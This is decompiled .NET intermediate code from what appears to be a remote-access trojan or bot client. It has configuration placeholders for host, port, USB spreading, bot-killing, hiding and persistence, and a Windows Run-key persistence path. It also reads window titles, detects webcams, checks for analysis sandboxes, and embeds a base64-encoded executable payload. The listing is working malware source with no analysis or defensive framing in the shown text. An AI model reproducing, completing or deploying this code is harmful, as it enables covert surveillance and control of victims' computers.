    IL_00bb:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00c0:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_00c5:  ldstr      "[H]"
    IL_00ca:  stsfld     string j.OK::H
    IL_00cf:  ldstr      "[Idr]"
    IL_00d4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00d9:  stsfld     bool j.OK::Idr
    IL_00de:  ldstr      "[Anti_CH]"
    IL_00e3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00e8:  stsfld     bool j.OK::Anti_CH
    IL_00ed:  ldstr      "[Isf]"
    IL_00f2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00f7:  stsfld     bool j.OK::IsF
    IL_00fc:  ldstr      "[USB_SP]"
    IL_0101:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0106:  stsfld     bool j.OK::USB_SP
    IL_010b:  ldstr      "[Isu]"
    IL_0110:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0115:  stsfld     bool j.OK::Isu
    IL_011a:  ldnull
    IL_011b:  stsfld     class j.kl j.OK::kq
    IL_0120:  ldstr      ""
    IL_0125:  stsfld     string j.OK::lastcap
    IL_012a:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_012f:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0134:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0139:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_013e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0143:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_0148:  ldnull
    IL_0149:  stsfld     object j.OK::MT
    IL_014e:  ldstr      "[P]"
    IL_0153:  stsfld     string j.OK::P
    IL_0158:  ldnull
    IL_0159:  stsfld     object j.OK::PLG
    IL_015e:  ldstr      "[EXE]"
    IL_0163:  stsfld     string j.OK::RG
    IL_0168:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_016d:  stsfld     string j.OK::sf
    IL_0172:  ldstr      "[VN]"
    IL_0177:  stsfld     string j.OK::VN
    IL_017c:  ldstr      "Platinum"
    IL_0181:  stsfld     string j.OK::VR
    IL_0186:  ldstr      "[Y]"
    IL_018b:  stsfld     string j.OK::Y
    IL_0190:  ldstr      "[BOTKILL]"
    IL_0195:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_019a:  stsfld     bool j.OK::BOT_KILL
    IL_019f:  ldstr      "[HIDE_ME]"
    IL_01a4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01a9:  stsfld     bool j.OK::HIDE_ME
    IL_01ae:  ldstr      "[Persis]"
    IL_01b3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01b8:  stsfld     bool j.OK::Persis
    IL_01bd:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldnull
    IL_0008:  ldftn      void j.OK::Mouse()
    IL_000e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0013:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0018:  stfld      class [mscorlib]System.Threading.Thread j.OK::MouseThread
    IL_001d:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method private static void  Mouse() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             valuetype [System.Drawing]System.Drawing.Point V_7)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Mouse()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0017:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001c:  stloc.3
    IL_001d:  ldloca.s   V_3
    IL_001f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0024:  stloc.1
    IL_0025:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_002a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_002f:  stloc.3
    IL_0030:  ldloca.s   V_3
    IL_0032:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.1
    IL_0039:  stloc.s    V_4
    IL_003b:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0040:  dup
    IL_0041:  ldc.i4.0
    IL_0042:  ldloc.2
    IL_0043:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0048:  stloc.s    V_5
    IL_004a:  ldc.i4.0
    IL_004b:  ldloc.1
    IL_004c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0051:  stloc.s    V_6
    IL_0053:  ldloca.s   V_7
    IL_0055:  ldloc.s    V_5
    IL_0057:  call       instance void [System.Drawing]System.Drawing.Point::set_X(int32)
    IL_005c:  ldloca.s   V_7
    IL_005e:  ldloc.s    V_6
    IL_0060:  call       instance void [System.Drawing]System.Drawing.Point::set_Y(int32)
    IL_0065:  ldloc.s    V_7
    IL_0067:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
    IL_006c:  ldc.i4.s   50
    IL_006e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0073:  ldloc.s    V_4
    IL_0075:  ldc.i4.1
    IL_0076:  add.ovf
    IL_0077:  stloc.s    V_4
    IL_0079:  ldloc.s    V_4
    IL_007b:  ldc.i4.s   100
    IL_007d:  ble.s      IL_003b

    IL_007f:  ldloc.0
    IL_0080:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_0085:  ret
  } // end of method OK::Mouse

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed noinlining nooptimization
  {
    // Code size       1133 (0x46d)
    .maxstack  5
    .locals init (uint8[] V_0,
             string[] V_1,
             int32 V_2,
             int32 V_3,
             class [mscorlib]System.Exception V_4,
             object V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9,
             string V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12)
    IL_0000:  ldsfld     bool j.OK::ANYRUN
    IL_0005:  brfalse    IL_00cc

    IL_000a:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_000f:  ldstr      "sand.dat"
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0019:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_001e:  brfalse.s  IL_002c

    IL_0020:  ldstr      "127.0.0.1"
    IL_0025:  stsfld     string j.OK::H
    IL_002a:  br.s       IL_009d

    IL_002c:  ldstr      "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"
    + "4wGBgChAWELEgCsBiILBgBYB0YHBgCBAowGBgAuAx4KCgByA70GBgCeA18JBgB6CF8KBgDC"
    + "BzEHCgDKAhwHBgACC4wGDgBJA/cJCgDECEsGEgD+BiILDgBpAa4JDgB8Aa4JBgC3AYwGBgC"
    + "7DEYHCgDVAhwHBgB0Cx4KDgByBvcJBgBXCboFDgCXCK4JBgCfCIwGEgB8BiILBgCrALoFBg"
    + "A2DIwGDgCDC/cJEgAKByILDgAWCXIJDgDjDD4KBgBGBk0ABgAMBowGBgDrCE0ABgD4CE0AC"
    + "gDOB18JCgARAl8JCgCNC18JBgCVAYwGFgBHAB0GEgBhBiILEgBbASILFgC1BR0GEgDxASIL"
    + "DgAcC/cJBgByB4wGBgBACYwGDgCAAPcJBgCnB4wGCgBMDEsGBgCfB4wGAAAAAD4AAAAAAAE"
    + "AAQAAAAAA/AaiDEUAAQABAAAAAAAlCaIMVQABAAQAAAEQAMwLogxhAAEABQAAAQAAeQpwCm"
    + "EABgALAAABEAD3CqIMlQAIAA4AAAEAANAMogxhAAsAEgABAAAAOAABAHUACwATAAUBAABBC"
    + "wAAYQAMABcABQEAAKAJAABhAA4AIAAFAQAABwAAAGEADgAnADEAIAihATEA9wepATEACwix"
    + "AREAVwi5ATEAOQjBAREAsQbJAREAngLOAREAMgHTAREAigjXAREAtQvaAQEAowvdAREA2QD"
    + "iAQYAIgDmAREAcwWDAVAgAABIABMA2gbqAQEAZyAAAAAABhhKCQYAAgCMIAAAAADEAqAGBg"
    + "ACAJ4gAAAAAAYYSgkGAAIApiAAAAAAERhQCfgAAgDaIAAAAAATCAkJ8AECAOYgAAAAABMI7"
    + "Ab1AQIA8iAAAAAAEwjPCPoBAgD+IAAAAAATCDcL/wECAAohAAAAABMIkAkEAgIAFiEAAAAA"
    + "Ewh2CAkCAgBIIQAAAAATCIYCDwICAE8hAAAAABMIkgIVAgIAVyEAAAAAERhQCfgAAwB8IQA"
    + "AAAAGGEoJBgADAIQhAAAAABEA5gocAgMAnCEAAAAAFggIDCQCBQAEIgAAAAATCNkKJAIFAA"
    + "siAAAAAAYYSgkGAAUALCIAAAAAAQCyACkCBQAsIwAAAADEAugCFQAHAGwjAAAAAAEAQgwGA"
    + "AgA+CMAAAAAEQBtADECCAD8JAAAAAABAFkAOQIJABElAAAAAAYYSgkGAAoAGSUAAAAAxgIV"
    + "CzMBCgAnJQAAAADGAksBbgELAC8lAAAAAIMAfgJBAgsAOyUAAAAAxgIKBl0BCwBDJQAAAAA"
    + "GCCoARgILAFwlAAAAAAYINABLAgsAgSUAAAAAxgIVCzMBDACPJQAAAADGAksBbgENAJclAA"
    + "AAAIMAfgJBAg0AoyUAAAAAxgIKBl0BDQCsJQAAAAARAG0AMQINAMwlAAAAAAEAWQA5Ag4A1"
    + "SUAAAAABhhKCQYADwDdJQAAAAADCCIBdAAPAPolAAAAAAYYSgkGAA8AAAABAAcLAAABAJAF"
    + "AAABAG8IAAACALgFAAABAG8IAAACALgFAAABABMGAAABADkBAAABAEIBAAABAN0HAAABAJA"
    + "FAAABAN0HAAABAEIBAAABAEIBCQBKCQEAEQBKCQYAGQBKCQoAKQBKCRAAMQBKCRAAOQBKCR"
    + "AAQQBKCRAASQBKCRAAUQBKCRAAWQBKCRUAYQBKCRAAaQBKCRAAcQBKCRoAgQBKCSAAkQBKC"
    + "QYAmQBKCQYAoQBKCQYAsQBKCQYAuQBKCQYA0QBKCSYA2QBKCQYAAQFKCQYACQFKCRAAEQFK"
    + "CQYAOQFKCQYAiQDLBS4ASQEUDDIAiQCxBzcAiQBKCT0AiQD+ABUAiQDCChUAiQDvCxUAiQD"
    + "bAUQAiQCTBksAqQBKCQYADABKCQYAFABKCQYAHABKCQYAJABKCQYALABKCQYADAAiAXQAFA"
    + "AiAXQAHAAiAXQAJAAiAXQALAAiAXQAwQAMC3kA+QDJAX8A+QC3DIcAGQFKCY0AcQHsAJUAw"
    + "QBKCQYAeQGHBZ4AKQFKCQYAiQDWC6MAKQGWBQYAgQFiAqsAiQEDCasAkQFKCbAAiQC1B7YA"
    + "iQEDDKsA6QBKCQYAmQFKCbAA6QC9AL0AoQGrARUAqQHfB8QAsQE6AskAuQH8Bc0AwQFHAsk"
    + "AyQGEBtQA2QE/BskA4QGuC9oA0QHYCOAA8QFYAhAA6QHiAgYA+QFKCQYASQEsBskA+QGVCx"
    + "AA+QEBAugA+QGADBUA+QEtAhAACQJWDO8A6QDiAgYASQEDDPgAEQLoAgYA6QDoAhUAoQFcD"
    + "AYAGQJKCfwAIQJJCwIBIQJXAQkBMQJKCRAB6QCrBRYB6QCTDBUA6QDtAR0BoQEkAhAA6QDE"
    + "DCQB6QDfBhUA6QDlBxUA6QB3DBAAoQFqDBUAoQHKAKMA4QCrDDMBQQLqBTgBSQJKCRAA4QB"
    + "KCQYA4QDGAD8BUQITAUUBWQIwCVABYQKMB1cBYQKJAV0BSQJKCWEB4QCbBWkBaQLoAgYAwQ"
    + "AVCzMBwQBLAW4BwQAKBl0BcQJKCRAAPABzBYMBIAB7APMCIACDAPMCIABzAK0CKQC7AHEEL"
    + "gALAIUCLgATAI4CLgAbAK0CLgAjALYCLgArALYCLgAzALYCLgA7ALYCLgBDALYCLgBLALYC"
    + "LgBTALYCLgBbALwCLgBjAOYCQACLAPMCQwBrAAEDQwBzAPgCSQC7AIIEYACLAPMCYwBrAAE"
    + "DYwBzAPgCaQC7AJYEgACDAPMCgABzAPgCgwCTAPMCgwCbAPMCgwBrAAEDiQC7AKMEowCTAP"
    + "MCowBrABoDowDDAPMCowCzAPMCowCbAPMCqQC7ALEEwACDAPMCwwCzAPMCwwBrAFwDwwBzA"
    + "K0CyQBzAK0C4ACDAPMC4wCTAPMC4wCbAPMC4wDDAPMC4wCzAPMC6QBzAK0CAAGDAPMCAwHL"
